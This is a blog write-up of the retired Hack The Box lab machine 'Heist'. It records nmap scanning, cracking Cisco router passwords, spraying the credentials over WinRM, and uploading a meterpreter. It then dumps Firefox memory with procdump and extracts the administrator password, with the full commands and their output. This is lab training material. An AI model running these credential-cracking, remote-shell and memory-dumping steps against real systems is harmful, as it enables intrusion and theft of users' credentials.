
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="robots"/>
<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
<meta content="maggick" name="author"/>
<meta content="This is a writeup about a retired HacktheBox machine: Heist This box is classified as an easy machine. It implies some CISCO router configuration, a MS Windows server with a WinRM service, a meterpreter, a tentative of Lazagne and procdump." name="description"/>
<meta content="security, boot2root, HTB, Cisco, winrm, procdump, meterpreter, windows" name="keywords"/>
<meta content="maggick's logs" property="og:site_name">
<meta content="HTB: Heist" property="og:title"/>
<meta content="This is a writeup about a retired HacktheBox machine: Heist This box is classified as an easy machine. It implies some CISCO router configuration, a MS Windows server with a WinRM service, a meterpreter, a tentative of Lazagne and procdump." property="og:description"/>
<meta content="en_US" property="og:locale"/>
<meta content="../../2019/12/htb-heist.html" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="2019-12-01 17:35:00+01:00" property="article:published_time"/>
<meta content="" property="article:modified_time"/>
<meta content="../../author/maggick.html" property="article:author"/>
<meta content="security" property="article:section">
<meta content="security" property="article:tag"/>
<meta content="boot2root" property="article:tag"/>
<meta content="HTB" property="article:tag"/>
<meta content="Cisco" property="article:tag"/>
<meta content="winrm" property="article:tag"/>
<meta content="procdump" property="article:tag"/>
<meta content="meterpreter" property="article:tag"/>
<meta content="windows" property="article:tag"/>
<meta content="https://maggick.fr/media/image.png" property="og:image"/>
<title>maggick's logs – HTB: Heist</title>
</meta></meta></head>
<body>
<aside>
<div>
<a href="../../">
<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
</a>
<h1>
<a href="../../">maggick's logs</a>
</h1>
<p>Offensive security tales</p>
<nav>
<ul class="list">
<li>
<a href="../../pages/about.html" target="_self">
                About
              </a>
</li>
<li>
<a href="../../pages/links.html" target="_self">
                Links
              </a>
</li>
<li>
<a href="../../pages/notes.html" target="_self">
                Notes
              </a>
</li>
<li>
<a href="../../pages/tools.html" target="_self">
                Tools
              </a>
</li>
</ul>
</nav>
<ul class="social">
<li>
<a class="sc-github" href="https://github.com/maggick" target="_blank">
<i class="fa-brands fa-github"></i>
</a>
</li>
<li>
<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
<i class="fa-brands fa-twitter"></i>
</a>
</li>
<li>
<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
<i class="fa-brands fa-stack-overflow"></i>
</a>
</li>
<li>
<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
<i class="fa-solid fa-rss"></i>
</a>
</li>
</ul>
</div>
</aside>
<main>
<nav>
<a href="../../">Home</a>
<a href="/archives.html">Archives</a>
<a href="/categories.html">Categories</a>
<a href="/tags.html">Tags</a>
<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
</nav>
<article class="single">
<header>
<h1 id="htb-heist">HTB: Heist</h1>
<p>
      Posted on 01 Dec 2019 in <a href="../../category/security.html">security</a>

        • 7 min read
    </p>
</header>
<div>
<p><img alt="Heist card" class="align-left" src="/media/2019.12/heist_card.png" width="262"/></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/201">Heist</a>
This box is classified as an easy machine.
It implies some CISCO router configuration, a MS Windows server with a WinRM
service, a meterpreter, a tentative of Lazagne and procdump.</p>
<p>[TOC]</p>
<h1>Recon</h1>
<p>We start with an nmap scan.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Wed Nov  6 15:29:09 2019 as: nmap -p- -sSV -oA nmap 10.10.10.149
Nmap scan report for 10.10.10.149
Host is up (0.23s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov  6 15:34:10 2019 -- 1 IP address (1 host up) scanned in 301.46 seconds
</code></pre></div>
<h2>port 80: HTTP</h2>
<p>This port is the web service.</p>
<h2>port 135: MSRPC</h2>
<h2>Port 445: SMB</h2>
<p>This port is for SMB.</p>
<h2>Port 5985: WinRM</h2>
<p>This port is used by the WinRM service</p>
<h2>Port 49669: MSRPC</h2>
<h1>Web</h1>
<p>We found an authentication page with an option to login as a guest.
Then we see a conversation between an user and the support about a CISCO router
configuration.</p>
<p><img alt="configuration cisco" class="image-process-article-image" src="/media/2019.12/derivatives/article-image/heist_1.png"/></p>
<p>The router configuration is the following:</p>
<div class="highlight"><pre><span></span><code>version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
synchronization
bgp log-neighbor-changes
bgp dampening
network 192.168.0.0Â mask 300.255.255.0
timers bgp 3 9
redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
session-timeout 600
authorization exec SSH
transport input ssh
</code></pre></div>
<p>We use <a href="https://github.com/theevilbit/ciscot7">a cisco type 7 decrypter</a> to get
the <code>rout3r</code> and <code>admin</code> passwords.</p>
<div class="highlight"><pre><span></span><code>python ciscot7.py -d -p 0242114B0E143F015F5D1E161713
Decrypted password: $uperP@ssword
python ciscot7.py -d -p 02375012182C1A1D751618034F36415408
Decrypted password: Q4)sJu\Y8qz*A3?d
</code></pre></div>
<p>For the hashed password we use john with rockyou:</p>
<div class="highlight"><pre><span></span><code>john hash -w=~/tools/password_lists/rockyou.txt
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)
</code></pre></div>
<p>We now have three potential users as well as three potential passwords. The
users:
  1. admin
  2. rout3r
  3. Hazard</p>
<p>The passwords:
  1. <code>$uperP@ssword</code>
  2. <code>Q4)sJu\Y8qz*A3?d</code>
  3. <code>stealth1agent</code></p>
<p>We want to connect using the WinRM service. We can use
<a href="https://github.com/Hackplayers/evil-winrm">evil winrm</a> as well as a simple
ruby script:</p>
<div class="highlight"><pre><span></span><code><span class="nb">require</span><span class="w"> </span><span class="s1">'winrm'</span>

<span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="no">WinRM</span><span class="o">::</span><span class="no">Connection</span><span class="o">.</span><span class="n">new</span><span class="p">(</span>
<span class="w">  </span><span class="ss">endpoint</span><span class="p">:</span><span class="w"> </span><span class="s1">'http://10.10.10.149:5985/wsman'</span><span class="p">,</span>
<span class="w">  </span><span class="ss">user</span><span class="p">:</span><span class="w"> </span><span class="s1">'rout3r'</span><span class="p">,</span>
<span class="w">  </span><span class="ss">password</span><span class="p">:</span><span class="w"> </span><span class="s1">'Q4)sJu\Y8qz*A3?d'</span><span class="p">,</span>
<span class="p">)</span>

<span class="n">command</span><span class="o">=</span><span class="s2">""</span>

<span class="n">conn</span><span class="o">.</span><span class="n">shell</span><span class="p">(</span><span class="ss">:powershell</span><span class="p">)</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="o">|</span><span class="n">shell</span><span class="o">|</span>
<span class="w">    </span><span class="k">until</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">"exit</span><span class="se">\n</span><span class="s2">"</span><span class="w"> </span><span class="k">do</span>
<span class="w">        </span><span class="nb">print</span><span class="w"> </span><span class="s2">"PS &gt; "</span>
<span class="w">        </span><span class="n">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">gets</span>
<span class="w">        </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shell</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">)</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="o">|</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="n">stderr</span><span class="o">|</span>
<span class="w">            </span><span class="no">STDOUT</span><span class="o">.</span><span class="n">print</span><span class="w"> </span><span class="n">stdout</span>
<span class="w">            </span><span class="no">STDERR</span><span class="o">.</span><span class="n">print</span><span class="w"> </span><span class="n">stderr</span>
<span class="w">        </span><span class="k">end</span>
<span class="w">    </span><span class="k">end</span>
<span class="w">    </span><span class="nb">puts</span><span class="w"> </span><span class="s2">"Exiting with code </span><span class="si">#{</span><span class="n">output</span><span class="o">.</span><span class="n">exitcode</span><span class="si">}</span><span class="s2">"</span>
<span class="k">end</span>
</code></pre></div>
<p>Trying all the possible combination won't give up a shell. We need more
enumeration. We launch
<a href="https://github.com/SecureAuthCorp/impacket/">impacket's lookupsid</a> using the
different user/password combinations. One is working with the Hazard user and
the <code>stealth1agent</code> password:</p>
<div class="highlight"><pre><span></span><code>python lookupsid.py Hazard:stealth1agent@10.10.10.149
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
</code></pre></div>
<p>We have more users now! We can eliminate the <code>stealth1agent</code> password as this is
Hazard's password.
A few combination later using winrm, we discover that the user Chase use the
<code>Q4)sJu\Y8qz*A3?d</code> password. We have a shell and the user flag:</p>
<div class="highlight"><pre><span></span><code>ruby winrm.rb
PS &gt; whoami
supportdesk\chase
PS &gt; dir ../Desktop


    Directory: C:\Users\Chase\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/22/2019   9:08 AM            121 todo.txt
-a----        4/22/2019   9:07 AM             32 user.txt


PS &gt; type ../Desktop/user.txt
a127d&lt;redacted&gt;
PS &gt; type ../Desktop/todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
</code></pre></div>
<p>We can upload a meterpreter (generated with msfvenom) using
<a href="https://github.com/Hackplayers/evil-winrm">evil winrm</a></p>
<div class="highlight"><pre><span></span><code>evil-winrm  -i 10.10.10.149 -u ^Case -p 'Q4)sJu\Y8qz*A3?d'
</code></pre></div>
<p>The meterpreter allow us to easy enumerate the box. Let us take a look at the
running process:</p>
<div class="highlight"><pre><span></span><code>meterpreter &gt; ps

Process List
============

PID   PPID  Name                     Arch  Session  User               Path
---   ----  ----                     ----  -------  ----               ----
0     0     [System Process]                                           
4     0     System                                                     
104   4     Registry                                                   
268   612   svchost.exe                                                
300   4     smss.exe                                                   
340   612   svchost.exe                                                
404   396   csrss.exe                                                  
408   612   svchost.exe                                                
480   396   wininit.exe                                                
488   472   csrss.exe                                                  
544   472   winlogon.exe                                               
612   480   services.exe                                               
632   480   lsass.exe                                                  
652   792   dllhost.exe              x64   1        SUPPORTDESK\Chase  C:\Windows\System32\dllhost.exe
684   612   svchost.exe                                                
764   612   svchost.exe                                                
784   612   svchost.exe                                                
792   612   svchost.exe                                                
812   544   fontdrvhost.exe                                            
820   480   fontdrvhost.exe                                            
904   612   svchost.exe                                                
956   612   svchost.exe                                                
984   612   svchost.exe                                                
1020  544   dwm.exe                                                    
1052  612   svchost.exe                                                
1128  612   svchost.exe                                                
1164  612   svchost.exe                                                
1184  612   svchost.exe                                                
1248  612   svchost.exe                                                
1300  612   svchost.exe                                                
1348  612   svchost.exe                                                
1356  612   svchost.exe                                                
1364  612   svchost.exe                                                
1376  612   svchost.exe                                                
1468  612   svchost.exe                                                
1512  612   svchost.exe                                                
1580  612   svchost.exe                                                
1624  612   svchost.exe                                                
1632  612   svchost.exe                                                
1720  612   svchost.exe                                                
1780  1468  taskhostw.exe                                              
1820  612   svchost.exe                                                
1896  612   svchost.exe                                                
1968  612   svchost.exe                                                
1992  612   svchost.exe                                                
2216  612   svchost.exe                                                
2564  612   spoolsv.exe                                                
2624  612   svchost.exe                                                
2632  612   svchost.exe                                                
2640  612   svchost.exe                                                
2660  612   svchost.exe                                                
2700  792   TiWorker.exe                                               
2708  612   svchost.exe                                                
2716  612   svchost.exe                                                
2740  612   svchost.exe                                                
2768  612   svchost.exe                                                
2776  612   svchost.exe                                                
2804  612   VGAuthService.exe                                          
2828  612   vmtoolsd.exe                                               
2852  612   svchost.exe                                                
2896  612   svchost.exe                                                
2920  612   svchost.exe                                                
2948  612   svchost.exe                                                
2956  612   MsMpEng.exe                                                
3024  5416  01.exe                   x64   0        SUPPORTDESK\Chase  C:\Users\Chase\Documents\01.exe
3036  612   svchost.exe                                                
3104  792   ShellExperienceHost.exe                                    
3224  612   svchost.exe                                                
3352  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe
3360  612   svchost.exe                                                
3376  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe
3720  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe
3784  612   svchost.exe                                                
3932  612   dllhost.exe                                                
3976  792   WmiPrvSE.exe                                               
4004  792   wsmprovhost.exe                                            
4040  612   svchost.exe                                                
4196  6808  conhost.exe                                                
4200  792   SearchUI.exe                                               
4216  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe
4236  612   msdtc.exe                                                  
4392  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe
4408  792   WmiPrvSE.exe                                               
4704  612   TrustedInstaller.exe                                       
4888  792   RuntimeBroker.exe                                          
5140  1184  sihost.exe                                                 
5148  612   svchost.exe                                                
5188  612   svchost.exe                                                
5260  1468  taskhostw.exe                                              
5352  612   svchost.exe                                                
5364  612   svchost.exe                                                
5416  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe
5456  612   svchost.exe                                                
5524  612   svchost.exe                                                
5572  792   RuntimeBroker.exe                                          
5584  5524  ctfmon.exe                                                 
5620  612   svchost.exe                                                
5908  5880  explorer.exe                                               
6080  3376  conhost.exe              x64   0        SUPPORTDESK\Chase  C:\Windows\System32\conhost.exe
6140  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe
6228  6852  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe
6304  792   RuntimeBroker.exe                                          
6388  6852  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe
6464  6672  php-cgi.exe                                                
6564  5908  vmtoolsd.exe                                               
6584  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe
6672  2896  w3wp.exe                                                   
6772  612   svchost.exe                                                
6792  6852  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe
6808  1468  MpCmdRun.exe                                               
6852  6676  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe
6940  612   svchost.exe                                                
6948  6672  php-cgi.exe                                                
6988  6852  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe
</code></pre></div>
<p>Our Chase user is running a Firefox Browser. The idea is to see if there is
credentials stored in the browser's password manager. For that we will use
<a href="https://github.com/AlessandroZ/LaZagne/">LaZagne</a>.</p>
<h2>Lazagne</h2>
<p>We upload the Lazagne executable using the meterpreter. Then using a shell we
launch LaZagne with the <code>browsers</code> parameter.</p>
<div class="highlight"><pre><span></span><code>meterpreter &gt; shell
Process 3468 created.
Channel 5 created.
Microsoft Windows [Version 10.0.17763.437]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Chase\Documents&gt;.\05.exe browsers
.\05.exe browsers

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


[+] 0 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.0
</code></pre></div>
<p>We did not found any password in the browser's password storage. Let us see what
is the process memory.</p>
<h2>procdump</h2>
<p>We upload procdump.exe from
<a href="https://docs.microsoft.com/en-us/sysinternals/">Systinternals</a> and dump the
Firefox process memory before downloading the dump on our machine.</p>
<div class="highlight"><pre><span></span><code>meterpreter &gt; upload procdump.exe 06.exe
[*] uploading  : procdump.exe -&gt; 06.exe
[*] Uploaded 467.19 KiB of 467.19 KiB (100.0%): procdump.exe -&gt; 06.exe
[*] uploaded   : procdump.exe -&gt; 06.exe

C:\Users\Chase\Documents&gt;.\06.exe -ma 6228
.\06.exe -ma 6228

ProcDump v6.00 - Writes process dump files
Copyright (C) 2009-2013 Mark Russinovich
Sysinternals - www.sysinternals.com
With contributions from Andrew Richards

Writing dump file C:\Users\Chase\Documents\firefox_191106_223459.dmp ...
Writing 293MB. Estimated time (less than) 9 seconds.
Dump written.

meterpreter &gt; download firefox_191106_223459.dmp ./
[*] Downloading: firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp
[*] Downloaded 1.00 MiB of 286.62 MiB (0.35%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp
[*] Downloaded 2.00 MiB of 286.62 MiB (0.7%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp
[*] Downloaded 3.00 MiB of 286.62 MiB (1.05%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp
[*] Downloaded 4.00 MiB of 286.62 MiB (1.4%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp
[*] Downloaded 5.00 MiB of 286.62 MiB (1.74%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp
</code></pre></div>
<p>We then <code>grep</code> in the dump for some password.</p>
<div class="highlight"><pre><span></span><code>strings firefox_191106_223459.dmp | grep -i password | grep admin -i
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
RG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
</code></pre></div>
<p>We can then use the login and password either to connect to the support website
or to the server using the <code>administrator</code> account.</p>
<div class="highlight"><pre><span></span><code>evil-winrm  -i 10.10.10.149 -u administrator -p '4dD!5}x/re8]FBuZ'

Evil-WinRM shell v1.8

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ../Desktop/root.txt
50dfa&lt;redacted&gt;
</code></pre></div>
<h1>Wrapping up</h1>
<p>In this machine we used evil-rm in to order to exploit the port 5985 as
I work on this machine after the forest one this was not something new (maybe
this article will be publish before the forest's one as I wait for the machine
to retire). We use a simple meterpreter and proc dump to found the password
stored in the Firefox memory.</p>
<p>I was a bit disappointed that there was no real exploitation of the CISCO router.
I was hoping for some pivoting from the first VM to another one use the router
or something similar.</p>
</div>
<div class="tag-cloud">
<p>
<a href="../../tag/security.html">security</a>
<a href="../../tag/boot2root.html">boot2root</a>
<a href="../../tag/htb.html">HTB</a>
<a href="../../tag/cisco.html">Cisco</a>
<a href="../../tag/winrm.html">winrm</a>
<a href="../../tag/procdump.html">procdump</a>
<a href="../../tag/meterpreter.html">meterpreter</a>
<a href="../../tag/windows.html">windows</a>
</p>
</div>
<div class="neighbors">
<a class="btn float-left" href="../../2019/11/htb-jarvis.html" title="HTB: Jarvis">
<i class="fa fa-angle-left"></i> Previous Post
    </a>
<a class="btn float-right" href="../../2019/12/htb-wall.html" title="HTB: Wall">
      Next Post <i class="fa fa-angle-right"></i>
</a>
</div>
</article>
<footer>
<p>
  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
</script>
</p><p>
<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
</img></a>
</p></footer> </main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>
</body>
</html>